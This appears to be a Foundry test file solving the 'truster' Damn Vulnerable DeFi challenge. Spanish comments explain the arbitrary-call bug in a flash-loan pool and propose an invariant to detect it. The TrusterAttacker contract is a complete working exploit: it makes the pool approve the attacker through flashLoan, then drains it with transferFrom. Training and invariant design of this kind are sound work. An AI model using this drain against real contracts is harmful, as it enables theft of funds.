// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

/*
 * NEXUS Offensive · training/dvd · reto "truster"
 *
 * CLASE DE BUG: llamada externa arbitraria con la autoridad del contrato.
 *   `flashLoan` hace `target.functionCall(data)` con target/data elegidos por
 *   el atacante. Se pasa target=token, data=approve(atacante, balance): el pool
 *   se auto-aprueba al atacante, que luego hace transferFrom y lo vacía. El
 *   flashLoan "se repaga" porque mueve 0 tokens; el drenaje ocurre después.
 *
 * FAMILIA: Flash loan / control de acceso.
 *
 * INVARIANTE QUE LO ATRAPA (NUEVA — hueco del catálogo Capa 2):
 *   `token.allowance(address(pool), <tercero>) == 0`  (el pool nunca otorga
 *   permiso de gasto de sus fondos a terceros). Capa 2 no tenía ninguna
 *   invariante de control de acceso / llamada arbitraria. => HUECO.
 */
contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        startHoax(deployer);
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);
        vm.stopPrank();
    }

    /// @notice INVARIANTE: el pool no otorga allowance de sus tokens a terceros.
    function _invariant_poolGrantsNoAllowance(address spender) internal view returns (bool) {
        return token.allowance(address(pool), spender) == 0;
    }

    function test_truster() public checkSolvedByPlayer {
        // La invariante se sostiene al inicio (ningún tercero tiene allowance).
        assertTrue(_invariant_poolGrantsNoAllowance(player), "INV debe sostenerse al inicio");

        // EXPLOIT en UNA sola tx del player: desplegar el atacante (CREATE).
        TrusterAttacker attacker = new TrusterAttacker(pool, token, recovery);

        // Durante el exploit el pool otorgó allowance total al atacante.
        console.log("allowance otorgada al atacante:", attacker.allowanceSeen());
        assertGt(attacker.allowanceSeen(), 0, "INV rota: el pool otorgo allowance arbitraria");
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

/// @notice Atacante de truster: todo en el constructor = una sola tx (CREATE).
contract TrusterAttacker {
    uint256 public allowanceSeen;

    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
        uint256 bal = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSelector(token.approve.selector, address(this), bal);
        pool.flashLoan(0, address(this), address(token), data);
        // Evidencia de la invariante rota: el pool nos aprobó sus fondos.
        allowanceSeen = token.allowance(address(pool), address(this));
        token.transferFrom(address(pool), recovery, bal);
    }
}
